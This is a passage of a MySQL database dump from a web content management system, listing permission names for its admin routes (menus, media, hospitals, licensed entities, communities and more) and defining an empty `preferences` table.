(132, 'cms.administration.edit', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(133, 'cms.administration.update', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(134, 'cms.administration.destroy', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(135, 'cms.administration_categories.index', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(136, 'cms.administration_categories.create', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(137, 'cms.administration_categories.store', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(138, 'cms.administration_categories.show', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(139, 'cms.administration_categories.edit', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(140, 'cms.administration_categories.update', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(141, 'cms.administration_categories.destroy', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(142, 'cms.administration_categories_members.store', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(143, 'cms.administration_categories_members.update', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(144, 'cms.administration_categories_members.destroy', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(145, 'cms.document-categories.index', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(146, 'cms.document-categories.create', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(147, 'cms.document-categories.store', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(148, 'cms.document-categories.show', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(149, 'cms.document-categories.edit', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(150, 'cms.document-categories.update', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(151, 'cms.document-categories.destroy', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(152, 'cms.documents.index', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(153, 'cms.documents.create', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(154, 'cms.documents.store', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(155, 'cms.documents.show', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(156, 'cms.documents.edit', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(157, 'cms.documents.update', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(158, 'cms.documents.destroy', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(159, 'cms.quickinfos.index', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(160, 'cms.quickinfos.create', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(161, 'cms.quickinfos.store', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(162, 'cms.quickinfos.show', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(163, 'cms.quickinfos.edit', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(164, 'cms.quickinfos.update', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(165, 'cms.quickinfos.destroy', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(166, 'cms.translations.index', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(167, 'cms.translations.create', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(168, 'cms.translations.store', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(169, 'cms.translations.show', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(170, 'cms.translations.destroy', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(171, 'cms.translations.update', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(172, 'cms.menu.index', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(173, 'cms.menu.create', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(174, 'cms.menu.store', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(175, 'cms.menu.show', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(176, 'cms.menu.edit', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(177, 'cms.menu.update', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(178, 'cms.menu.destroy', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(179, 'cms.', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(180, 'cms.menu-items.create', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(181, 'cms.menu-items.store', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(182, 'cms.menu-items.show', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(183, 'cms.menu-items.update', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(184, 'cms.menu-items.destroy', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(185, 'cms.menu-items.index', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(186, 'cms.menu-items.ajax-update', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(187, 'cms.menu-items.ajax-link-update', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(188, 'cms.galleries.index', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(189, 'cms.galleries.create', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(190, 'cms.galleries.store', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(191, 'cms.galleries.show', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(192, 'cms.galleries.edit', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(193, 'cms.galleries.update', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(194, 'cms.galleries.destroy', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(195, 'cms.media.create', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(196, 'cms.media.store', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(197, 'cms.media.show', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(198, 'cms.media.edit', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(199, 'cms.media.update', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(200, 'cms.media.destroy', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(201, 'cms.media.transfer-media', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(202, 'cms.media.transfer-gallery', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(203, 'cms.media.index', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(204, 'cms.media.bulk', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(205, 'cms.media.bulk-upload-images', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(206, 'cms.pages.index', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(207, 'cms.pages.create', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(208, 'cms.pages.store', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(209, 'cms.pages.show', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(210, 'cms.pages.edit', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(211, 'cms.pages.update', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(212, 'cms.pages.destroy', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(213, 'cms.roles.index', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(214, 'cms.roles.store', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(215, 'cms.roles.show', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(216, 'cms.roles.edit', 'web', '2022-03-11 04:11:12', '2022-03-11 04:11:12'),
(217, 'cms.roles.update', 'web', '2022-03-11 04:11:12', '2022-03-11 04:11:12'),
(218, 'cms.roles.destroy', 'web', '2022-03-11 04:11:12', '2022-03-11 04:11:12'),
(219, 'cms.cms.text-editor.upload', 'web', '2022-03-11 04:11:12', '2022-03-11 04:11:12'),
(220, 'cms.cms.text-editor.upload_file', 'web', '2022-03-11 04:11:12', '2022-03-11 04:11:12'),
(221, 'cms.cms.text-editor.getimages', 'web', '2022-03-11 04:11:12', '2022-03-11 04:11:12'),
(222, 'cms.cms.text-editor.getfiles', 'web', '2022-03-11 04:11:12', '2022-03-11 04:11:12'),
(223, 'cms.cms.text-editor.delete_file', 'web', '2022-03-11 04:11:12', '2022-03-11 04:11:12'),
(224, 'cms.users.create-user-form', 'web', '2022-03-11 04:11:12', '2022-03-11 04:11:12'),
(225, 'cms.users.edit-user', 'web', '2022-03-11 04:11:12', '2022-03-11 04:11:12'),
(226, 'cms.users.update-user', 'web', '2022-03-11 04:11:12', '2022-03-11 04:11:12'),
(227, 'cms.users.destroy', 'web', '2022-03-11 04:11:12', '2022-03-11 04:11:12'),
(228, 'cms.users.create-user', 'web', '2022-03-11 04:11:12', '2022-03-11 04:11:12'),
(229, 'cms.users.user-roles-form', 'web', '2022-03-11 04:11:12', '2022-03-11 04:11:12'),
(230, 'cms.users.update-user-roles', 'web', '2022-03-11 04:11:12', '2022-03-11 04:11:12'),
(231, 'cms.users.user-permissions-form', 'web', '2022-03-11 04:11:12', '2022-03-11 04:11:12'),
(232, 'cms.users.update-user-permissions', 'web', '2022-03-11 04:11:12', '2022-03-11 04:11:12'),
(233, 'cms.users.user-change-password-form', 'web', '2022-03-11 04:11:12', '2022-03-11 04:11:12'),
(234, 'cms.users.user-change-password', 'web', '2022-03-11 04:11:12', '2022-03-11 04:11:12'),
(235, 'cms.dg_messages.index', 'web', '2022-06-14 13:53:44', '2022-06-14 13:53:44'),
(236, 'cms.dg_messages.create', 'web', '2022-06-14 13:53:44', '2022-06-14 13:53:44'),
(237, 'cms.dg_messages.store', 'web', '2022-06-14 13:53:44', '2022-06-14 13:53:44'),
(238, 'cms.dg_messages.show', 'web', '2022-06-14 13:53:44', '2022-06-14 13:53:44'),
(239, 'cms.dg_messages.edit', 'web', '2022-06-14 13:53:45', '2022-06-14 13:53:45'),
(240, 'cms.dg_messages.update', 'web', '2022-06-14 13:53:45', '2022-06-14 13:53:45'),
(241, 'cms.dg_messages.destroy', 'web', '2022-06-14 13:53:45', '2022-06-14 13:53:45'),
(242, 'cms.online_services.index', 'web', '2022-06-14 13:57:09', '2022-06-14 13:57:09'),
(243, 'cms.online_services.create', 'web', '2022-06-14 13:57:09', '2022-06-14 13:57:09'),
(244, 'cms.online_services.store', 'web', '2022-06-14 13:57:09', '2022-06-14 13:57:09'),
(245, 'cms.online_services.show', 'web', '2022-06-14 13:57:09', '2022-06-14 13:57:09'),
(246, 'cms.online_services.edit', 'web', '2022-06-14 13:57:09', '2022-06-14 13:57:09'),
(247, 'cms.online_services.update', 'web', '2022-06-14 13:57:09', '2022-06-14 13:57:09'),
(248, 'cms.online_services.destroy', 'web', '2022-06-14 13:57:10', '2022-06-14 13:57:10'),
(249, 'cms.howdois.index', 'web', '2022-06-14 13:57:10', '2022-06-14 13:57:10'),
(250, 'cms.howdois.create', 'web', '2022-06-14 13:57:10', '2022-06-14 13:57:10'),
(251, 'cms.howdois.store', 'web', '2022-06-14 13:57:10', '2022-06-14 13:57:10'),
(252, 'cms.howdois.show', 'web', '2022-06-14 13:57:10', '2022-06-14 13:57:10'),
(253, 'cms.howdois.edit', 'web', '2022-06-14 13:57:10', '2022-06-14 13:57:10'),
(254, 'cms.howdois.update', 'web', '2022-06-14 13:57:10', '2022-06-14 13:57:10'),
(255, 'cms.howdois.destroy', 'web', '2022-06-14 13:57:10', '2022-06-14 13:57:10'),
(256, 'cms.quotes.index', 'web', '2022-06-14 13:57:11', '2022-06-14 13:57:11'),
(257, 'cms.quotes.create', 'web', '2022-06-14 13:57:11', '2022-06-14 13:57:11'),
(258, 'cms.quotes.store', 'web', '2022-06-14 13:57:11', '2022-06-14 13:57:11'),
(259, 'cms.quotes.show', 'web', '2022-06-14 13:57:11', '2022-06-14 13:57:11'),
(260, 'cms.quotes.edit', 'web', '2022-06-14 13:57:11', '2022-06-14 13:57:11'),
(261, 'cms.quotes.update', 'web', '2022-06-14 13:57:11', '2022-06-14 13:57:11'),
(262, 'cms.quotes.destroy', 'web', '2022-06-14 13:57:11', '2022-06-14 13:57:11'),
(263, 'cms.campaigns.index', 'web', '2022-06-21 16:21:29', '2022-06-21 16:21:29'),
(264, 'cms.campaigns.create', 'web', '2022-06-21 16:21:29', '2022-06-21 16:21:29'),
(265, 'cms.campaigns.store', 'web', '2022-06-21 16:21:29', '2022-06-21 16:21:29'),
(266, 'cms.campaigns.show', 'web', '2022-06-21 16:21:29', '2022-06-21 16:21:29'),
(267, 'cms.campaigns.edit', 'web', '2022-06-21 16:21:30', '2022-06-21 16:21:30'),
(268, 'cms.campaigns.update', 'web', '2022-06-21 16:21:30', '2022-06-21 16:21:30'),
(269, 'cms.campaigns.destroy', 'web', '2022-06-21 16:21:30', '2022-06-21 16:21:30'),
(270, 'cms.quick_links.index', 'web', '2022-06-22 13:42:47', '2022-06-22 13:42:47'),
(271, 'cms.quick_links.create', 'web', '2022-06-22 13:42:47', '2022-06-22 13:42:47'),
(272, 'cms.quick_links.store', 'web', '2022-06-22 13:42:47', '2022-06-22 13:42:47'),
(273, 'cms.quick_links.show', 'web', '2022-06-22 13:42:47', '2022-06-22 13:42:47'),
(274, 'cms.quick_links.edit', 'web', '2022-06-22 13:42:47', '2022-06-22 13:42:47'),
(275, 'cms.quick_links.update', 'web', '2022-06-22 13:42:47', '2022-06-22 13:42:47'),
(276, 'cms.quick_links.destroy', 'web', '2022-06-22 13:42:47', '2022-06-22 13:42:47'),
(277, 'cms.hospitals.index', 'web', '2022-06-24 17:55:18', '2022-06-24 17:55:18'),
(278, 'cms.hospitals.create', 'web', '2022-06-24 17:55:18', '2022-06-24 17:55:18'),
(279, 'cms.hospitals.store', 'web', '2022-06-24 17:55:18', '2022-06-24 17:55:18'),
(280, 'cms.hospitals.show', 'web', '2022-06-24 17:55:18', '2022-06-24 17:55:18'),
(281, 'cms.hospitals.edit', 'web', '2022-06-24 17:55:18', '2022-06-24 17:55:18'),
(282, 'cms.hospitals.update', 'web', '2022-06-24 17:55:18', '2022-06-24 17:55:18'),
(283, 'cms.hospitals.destroy', 'web', '2022-06-24 17:55:18', '2022-06-24 17:55:18'),
(284, 'cms.trainings.index', 'web', '2022-06-30 01:20:03', '2022-06-30 01:20:03'),
(285, 'cms.trainings.create', 'web', '2022-06-30 01:20:03', '2022-06-30 01:20:03'),
(286, 'cms.trainings.store', 'web', '2022-06-30 01:20:03', '2022-06-30 01:20:03'),
(287, 'cms.trainings.show', 'web', '2022-06-30 01:20:04', '2022-06-30 01:20:04'),
(288, 'cms.trainings.edit', 'web', '2022-06-30 01:20:04', '2022-06-30 01:20:04'),
(289, 'cms.trainings.update', 'web', '2022-06-30 01:20:04', '2022-06-30 01:20:04'),
(290, 'cms.trainings.destroy', 'web', '2022-06-30 01:20:04', '2022-06-30 01:20:04'),
(291, 'cms.operators.index', 'web', '2022-06-30 01:20:04', '2022-06-30 01:20:04'),
(292, 'cms.operators.create', 'web', '2022-06-30 01:20:04', '2022-06-30 01:20:04'),
(293, 'cms.operators.store', 'web', '2022-06-30 01:20:04', '2022-06-30 01:20:04'),
(294, 'cms.operators.show', 'web', '2022-06-30 01:20:04', '2022-06-30 01:20:04'),
(295, 'cms.operators.edit', 'web', '2022-06-30 01:20:04', '2022-06-30 01:20:04'),
(296, 'cms.operators.update', 'web', '2022-06-30 01:20:04', '2022-06-30 01:20:04'),
(297, 'cms.operators.destroy', 'web', '2022-06-30 01:20:04', '2022-06-30 01:20:04'),
(298, 'cms.colateral-managers.index', 'web', '2022-06-30 01:20:05', '2022-06-30 01:20:05'),
(299, 'cms.colateral-managers.create', 'web', '2022-06-30 01:20:05', '2022-06-30 01:20:05'),
(300, 'cms.colateral-managers.store', 'web', '2022-06-30 01:20:05', '2022-06-30 01:20:05'),
(301, 'cms.colateral-managers.show', 'web', '2022-06-30 01:20:05', '2022-06-30 01:20:05'),
(302, 'cms.colateral-managers.edit', 'web', '2022-06-30 01:20:05', '2022-06-30 01:20:05'),
(303, 'cms.colateral-managers.update', 'web', '2022-06-30 01:20:05', '2022-06-30 01:20:05'),
(304, 'cms.colateral-managers.destroy', 'web', '2022-06-30 01:20:05', '2022-06-30 01:20:05'),
(305, 'cms.warehouses.index', 'web', '2022-06-30 01:20:05', '2022-06-30 01:20:05'),
(306, 'cms.warehouses.create', 'web', '2022-06-30 01:20:05', '2022-06-30 01:20:05'),
(307, 'cms.warehouses.store', 'web', '2022-06-30 01:20:05', '2022-06-30 01:20:05'),
(308, 'cms.warehouses.show', 'web', '2022-06-30 01:20:05', '2022-06-30 01:20:05'),
(309, 'cms.warehouses.edit', 'web', '2022-06-30 01:20:06', '2022-06-30 01:20:06'),
(310, 'cms.warehouses.update', 'web', '2022-06-30 01:20:06', '2022-06-30 01:20:06'),
(311, 'cms.warehouses.destroy', 'web', '2022-06-30 01:20:06', '2022-06-30 01:20:06'),
(312, 'cms.product_categories.index', 'web', '2022-06-30 01:20:06', '2022-06-30 01:20:06'),
(313, 'cms.product_categories.create', 'web', '2022-06-30 01:20:06', '2022-06-30 01:20:06'),
(314, 'cms.product_categories.store', 'web', '2022-06-30 01:20:07', '2022-06-30 01:20:07'),
(315, 'cms.product_categories.show', 'web', '2022-06-30 01:20:07', '2022-06-30 01:20:07'),
(316, 'cms.product_categories.edit', 'web', '2022-06-30 01:20:07', '2022-06-30 01:20:07'),
(317, 'cms.product_categories.update', 'web', '2022-06-30 01:20:07', '2022-06-30 01:20:07'),
(318, 'cms.product_categories.destroy', 'web', '2022-06-30 01:20:07', '2022-06-30 01:20:07'),
(319, 'cms.products.index', 'web', '2022-06-30 01:20:07', '2022-06-30 01:20:07'),
(320, 'cms.products.create', 'web', '2022-06-30 01:20:07', '2022-06-30 01:20:07'),
(321, 'cms.products.store', 'web', '2022-06-30 01:20:07', '2022-06-30 01:20:07'),
(322, 'cms.products.show', 'web', '2022-06-30 01:20:07', '2022-06-30 01:20:07'),
(323, 'cms.products.edit', 'web', '2022-06-30 01:20:07', '2022-06-30 01:20:07'),
(324, 'cms.products.update', 'web', '2022-06-30 01:20:07', '2022-06-30 01:20:07'),
(325, 'cms.products.destroy', 'web', '2022-06-30 01:20:08', '2022-06-30 01:20:08'),
(326, 'cms.achievements.index', 'web', '2022-06-30 01:43:26', '2022-06-30 01:43:26'),
(327, 'cms.achievements.create', 'web', '2022-06-30 01:43:26', '2022-06-30 01:43:26'),
(328, 'cms.achievements.store', 'web', '2022-06-30 01:43:26', '2022-06-30 01:43:26'),
(329, 'cms.achievements.show', 'web', '2022-06-30 01:43:26', '2022-06-30 01:43:26'),
(330, 'cms.achievements.edit', 'web', '2022-06-30 01:43:26', '2022-06-30 01:43:26'),
(331, 'cms.achievements.update', 'web', '2022-06-30 01:43:26', '2022-06-30 01:43:26'),
(332, 'cms.achievements.destroy', 'web', '2022-06-30 01:43:26', '2022-06-30 01:43:26'),
(333, 'cms.colateral_managers.index', 'web', '2022-06-30 20:55:44', '2022-06-30 20:55:44'),
(334, 'cms.colateral_managers.create', 'web', '2022-06-30 20:55:44', '2022-06-30 20:55:44'),
(335, 'cms.colateral_managers.store', 'web', '2022-06-30 20:55:44', '2022-06-30 20:55:44'),
(336, 'cms.colateral_managers.show', 'web', '2022-06-30 20:55:44', '2022-06-30 20:55:44'),
(337, 'cms.colateral_managers.edit', 'web', '2022-06-30 20:55:44', '2022-06-30 20:55:44'),
(338, 'cms.colateral_managers.update', 'web', '2022-06-30 20:55:44', '2022-06-30 20:55:44'),
(339, 'cms.colateral_managers.destroy', 'web', '2022-06-30 20:55:44', '2022-06-30 20:55:44'),
(340, 'cms.feedbacks.index', 'web', '2022-07-17 03:18:28', '2022-07-17 03:18:28'),
(341, 'cms.feedbacks.create', 'web', '2022-07-17 03:18:28', '2022-07-17 03:18:28'),
(342, 'cms.feedbacks.store', 'web', '2022-07-17 03:18:28', '2022-07-17 03:18:28'),
(343, 'cms.feedbacks.show', 'web', '2022-07-17 03:18:28', '2022-07-17 03:18:28'),
(344, 'cms.feedbacks.edit', 'web', '2022-07-17 03:18:28', '2022-07-17 03:18:28'),
(345, 'cms.feedbacks.update', 'web', '2022-07-17 03:18:28', '2022-07-17 03:18:28'),
(346, 'cms.feedbacks.destroy', 'web', '2022-07-17 03:18:28', '2022-07-17 03:18:28'),
(347, 'cms.partners.index', 'web', '2022-07-17 03:18:29', '2022-07-17 03:18:29'),
(348, 'cms.partners.create', 'web', '2022-07-17 03:18:29', '2022-07-17 03:18:29'),
(349, 'cms.partners.store', 'web', '2022-07-17 03:18:29', '2022-07-17 03:18:29'),
(350, 'cms.partners.show', 'web', '2022-07-17 03:18:29', '2022-07-17 03:18:29'),
(351, 'cms.partners.edit', 'web', '2022-07-17 03:18:29', '2022-07-17 03:18:29'),
(352, 'cms.partners.update', 'web', '2022-07-17 03:18:29', '2022-07-17 03:18:29'),
(353, 'cms.partners.destroy', 'web', '2022-07-17 03:18:29', '2022-07-17 03:18:29'),
(354, 'cms.licensedEntities.index', 'web', '2022-08-07 05:33:02', '2022-08-07 05:33:02'),
(355, 'cms.licensedEntities.create', 'web', '2022-08-07 05:33:02', '2022-08-07 05:33:02'),
(356, 'cms.licensedEntities.store', 'web', '2022-08-07 05:33:02', '2022-08-07 05:33:02'),
(357, 'cms.licensedEntities.show', 'web', '2022-08-07 05:33:02', '2022-08-07 05:33:02'),
(358, 'cms.licensedEntities.edit', 'web', '2022-08-07 05:33:03', '2022-08-07 05:33:03'),
(359, 'cms.licensedEntities.update', 'web', '2022-08-07 05:33:03', '2022-08-07 05:33:03'),
(360, 'cms.licensedEntities.destroy', 'web', '2022-08-07 05:33:03', '2022-08-07 05:33:03'),
(361, 'cms.licensed-entity-categories.index', 'web', '2022-08-07 05:33:03', '2022-08-07 05:33:03'),
(362, 'cms.licensed-entity-categories.create', 'web', '2022-08-07 05:33:03', '2022-08-07 05:33:03'),
(363, 'cms.licensed-entity-categories.store', 'web', '2022-08-07 05:33:03', '2022-08-07 05:33:03'),
(364, 'cms.licensed-entity-categories.show', 'web', '2022-08-07 05:33:03', '2022-08-07 05:33:03'),
(365, 'cms.licensed-entity-categories.edit', 'web', '2022-08-07 05:33:03', '2022-08-07 05:33:03'),
(366, 'cms.licensed-entity-categories.update', 'web', '2022-08-07 05:33:04', '2022-08-07 05:33:04'),
(367, 'cms.licensed-entity-categories.destroy', 'web', '2022-08-07 05:33:04', '2022-08-07 05:33:04'),
(368, 'cms.licensed-entities.index', 'web', '2022-08-07 05:35:25', '2022-08-07 05:35:25'),
(369, 'cms.licensed-entities.create', 'web', '2022-08-07 05:35:25', '2022-08-07 05:35:25'),
(370, 'cms.licensed-entities.store', 'web', '2022-08-07 05:35:25', '2022-08-07 05:35:25'),
(371, 'cms.licensed-entities.show', 'web', '2022-08-07 05:35:26', '2022-08-07 05:35:26'),
(372, 'cms.licensed-entities.edit', 'web', '2022-08-07 05:35:26', '2022-08-07 05:35:26'),
(373, 'cms.licensed-entities.update', 'web', '2022-08-07 05:35:26', '2022-08-07 05:35:26'),
(374, 'cms.licensed-entities.destroy', 'web', '2022-08-07 05:35:27', '2022-08-07 05:35:27'),
(375, 'cms.media_links.index', 'web', '2022-08-10 01:35:40', '2022-08-10 01:35:40'),
(376, 'cms.media_links.create', 'web', '2022-08-10 01:35:40', '2022-08-10 01:35:40'),
(377, 'cms.media_links.store', 'web', '2022-08-10 01:35:40', '2022-08-10 01:35:40'),
(378, 'cms.media_links.show', 'web', '2022-08-10 01:35:41', '2022-08-10 01:35:41'),
(379, 'cms.media_links.edit', 'web', '2022-08-10 01:35:41', '2022-08-10 01:35:41'),
(380, 'cms.media_links.update', 'web', '2022-08-10 01:35:41', '2022-08-10 01:35:41'),
(381, 'cms.media_links.destroy', 'web', '2022-08-10 01:35:41', '2022-08-10 01:35:41'),
(382, 'cms.important_links.index', 'web', '2022-08-10 01:35:41', '2022-08-10 01:35:41'),
(383, 'cms.important_links.create', 'web', '2022-08-10 01:35:41', '2022-08-10 01:35:41'),
(384, 'cms.important_links.store', 'web', '2022-08-10 01:35:41', '2022-08-10 01:35:41'),
(385, 'cms.important_links.show', 'web', '2022-08-10 01:35:41', '2022-08-10 01:35:41'),
(386, 'cms.important_links.edit', 'web', '2022-08-10 01:35:42', '2022-08-10 01:35:42'),
(387, 'cms.important_links.update', 'web', '2022-08-10 01:35:42', '2022-08-10 01:35:42'),
(388, 'cms.important_links.destroy', 'web', '2022-08-10 01:35:42', '2022-08-10 01:35:42'),
(389, 'cms.home_links.index', 'web', '2022-08-10 01:35:42', '2022-08-10 01:35:42'),
(390, 'cms.home_links.create', 'web', '2022-08-10 01:35:42', '2022-08-10 01:35:42'),
(391, 'cms.home_links.store', 'web', '2022-08-10 01:35:42', '2022-08-10 01:35:42'),
(392, 'cms.home_links.show', 'web', '2022-08-10 01:35:42', '2022-08-10 01:35:42'),
(393, 'cms.home_links.edit', 'web', '2022-08-10 01:35:42', '2022-08-10 01:35:42'),
(394, 'cms.home_links.update', 'web', '2022-08-10 01:35:43', '2022-08-10 01:35:43'),
(395, 'cms.home_links.destroy', 'web', '2022-08-10 01:35:43', '2022-08-10 01:35:43'),
(396, 'cms.more-infos.index', 'web', '2022-08-10 03:51:41', '2022-08-10 03:51:41'),
(397, 'cms.more-infos.create', 'web', '2022-08-10 03:51:41', '2022-08-10 03:51:41'),
(398, 'cms.more-infos.store', 'web', '2022-08-10 03:51:42', '2022-08-10 03:51:42'),
(399, 'cms.more-infos.show', 'web', '2022-08-10 03:51:42', '2022-08-10 03:51:42'),
(400, 'cms.more-infos.edit', 'web', '2022-08-10 03:51:42', '2022-08-10 03:51:42'),
(401, 'cms.more-infos.update', 'web', '2022-08-10 03:51:42', '2022-08-10 03:51:42'),
(402, 'cms.more-infos.destroy', 'web', '2022-08-10 03:51:42', '2022-08-10 03:51:42'),
(403, 'cms.licensed.entities.upload', 'web', '2022-10-14 11:20:34', '2022-10-14 11:20:34'),
(404, 'cms.projects.index', 'web', '2022-10-14 11:24:15', '2022-10-14 11:24:15'),
(405, 'cms.projects.create', 'web', '2022-10-14 11:24:15', '2022-10-14 11:24:15'),
(406, 'cms.projects.store', 'web', '2022-10-14 11:24:15', '2022-10-14 11:24:15'),
(407, 'cms.projects.show', 'web', '2022-10-14 11:24:15', '2022-10-14 11:24:15'),
(408, 'cms.projects.edit', 'web', '2022-10-14 11:24:15', '2022-10-14 11:24:15'),
(409, 'cms.projects.update', 'web', '2022-10-14 11:24:15', '2022-10-14 11:24:15'),
(410, 'cms.projects.destroy', 'web', '2022-10-14 11:24:15', '2022-10-14 11:24:15'),
(411, 'cms.communities.index', 'web', '2022-10-15 13:14:09', '2022-10-15 13:14:09'),
(412, 'cms.communities.create', 'web', '2022-10-15 13:14:09', '2022-10-15 13:14:09'),
(413, 'cms.communities.store', 'web', '2022-10-15 13:14:09', '2022-10-15 13:14:09'),
(414, 'cms.communities.show', 'web', '2022-10-15 13:14:10', '2022-10-15 13:14:10'),
(415, 'cms.communities.edit', 'web', '2022-10-15 13:14:10', '2022-10-15 13:14:10'),
(416, 'cms.communities.update', 'web', '2022-10-15 13:14:10', '2022-10-15 13:14:10'),
(417, 'cms.communities.destroy', 'web', '2022-10-15 13:14:10', '2022-10-15 13:14:10'),
(418, 'cms.communities.upload', 'web', '2022-10-15 13:14:10', '2022-10-15 13:14:10'),
(419, 'cms.community-categories.index', 'web', '2022-10-15 13:14:10', '2022-10-15 13:14:10'),
(420, 'cms.community-categories.create', 'web', '2022-10-15 13:14:10', '2022-10-15 13:14:10'),
(421, 'cms.community-categories.store', 'web', '2022-10-15 13:14:10', '2022-10-15 13:14:10'),
(422, 'cms.community-categories.show', 'web', '2022-10-15 13:14:10', '2022-10-15 13:14:10'),
(423, 'cms.community-categories.edit', 'web', '2022-10-15 13:14:10', '2022-10-15 13:14:10'),
(424, 'cms.community-categories.update', 'web', '2022-10-15 13:14:10', '2022-10-15 13:14:10'),
(425, 'cms.community-categories.destroy', 'web', '2022-10-15 13:14:10', '2022-10-15 13:14:10');

-- --------------------------------------------------------

--
-- Table structure for table `preferences`
--

CREATE TABLE `preferences` (
  `id` int(10) UNSIGNED NOT NULL,
  `feedback_email` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `whistle_email` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `show_loading` tinyint(1) DEFAULT NULL,
  `logo` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `member_icon` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `project_icon` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `university_icon` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `school_icon` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `user_id` int(11) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `preferences`
--

